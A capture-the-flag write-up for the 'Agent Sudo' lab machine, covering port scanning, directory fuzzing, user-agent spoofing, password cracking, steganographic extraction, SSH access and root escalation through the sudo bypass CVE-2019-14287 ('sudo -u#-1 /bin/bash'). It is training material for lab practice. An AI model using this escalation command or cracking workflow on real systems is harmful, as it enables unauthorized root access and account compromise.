---
title: Agent Sudo
date: 2025-10-05 11:13:00 +0200
media_subpath: /assets/img/2025-10-05-agentSudo
---

## **Reconnaissance**

```bash
sudo nmap -T4 -sS -sC -sV 10.10.251.117
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-20 01:39 EDT
Nmap scan report for 10.10.251.117
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.11 seconds
           
```
___
## **Enumeration**


#### *Website*
<img src="siteMessage.png" width="800" alt="agentC" style="display: block; margin: 0 auto;"/>


#### *ffuf Resulted Nothing too*
```bash
> ffuf -u http://10.10.117.171/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .php,.txt,.html,.png,.jpg -mc 200-299,301,302,307,401 -fc 403,404 -t 40

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.117.171/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .php .txt .html .png .jpg 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401
 :: Filter           : Response status: 403,404
________________________________________________
```

#### *Curl*
```bash
curl -A R -L 10.10.251.117
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
```

#### *Found  another agent*
<img src="agentC.png" width="800" alt="agentC" style="display: block; margin: 0 auto;"/>

**NB: nikto AND strings are just part of the enumeration but resulted nothing.**

___

## **Exploitation**

#### *Passwordd cracking - Hydra*
<img src="passCrack.png" width="800" alt="agentC" style="display: block; margin: 0 auto;"/>
#### *Download ftp files*
<img src="ftpDownload.png" width="800" alt="agentC" style="display: block; margin: 0 auto;"/>
#### *List of  downloaded files*
<img src="lsDownloaded.png" width="800" alt="agentC" style="display: block; margin: 0 auto;"/>


#### *Stenography*
 
```bash
>	stegseek -sf cute-alien.jpg   
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"           

[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".

>	steghide extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
```

<img src="binwalkEnum.png" width="800" alt="agentC" style="display: block; margin: 0 auto;"/>

#### *Cracking with john*

<img src="passCrackJohn.png" width="800" alt="agentC" style="display: block; margin: 0 auto;"/>
<img src="zipFilepass.png" width="800" alt="agentC" style="display: block; margin: 0 auto;"/>

#### *Message by R,  use cyberChef*
<img src="msgByR.png" width="800" alt="agentC" style="display: block; margin: 0 auto;"/>
#### *Found  Agent  J and  Pass*
<img src="msgByC.png" width="800" alt="agentC" style="display: block; margin: 0 auto;"/>


#### *ssh login*
<img src="sshJ.png" width="800" alt="agentC" style="display: block; margin: 0 auto;"/>
#### *Download image using scp*
```sh
scp james@10.10.251.117:Alien_autospy.jpg Alien_auto.jpg

```
#### *Find a Privilege Escalation technique*
```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

#### **NB: Search for '(ALL, !root) /bin/bash' exploit CVE : 2019-14287**

#### *Privilege Escalation*
```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
[sudo] password for james:
```
[CVE:2019-14287](https://www.exploit-db.com/exploits/47502)
## **You Know where to find the root flag. Bye!**


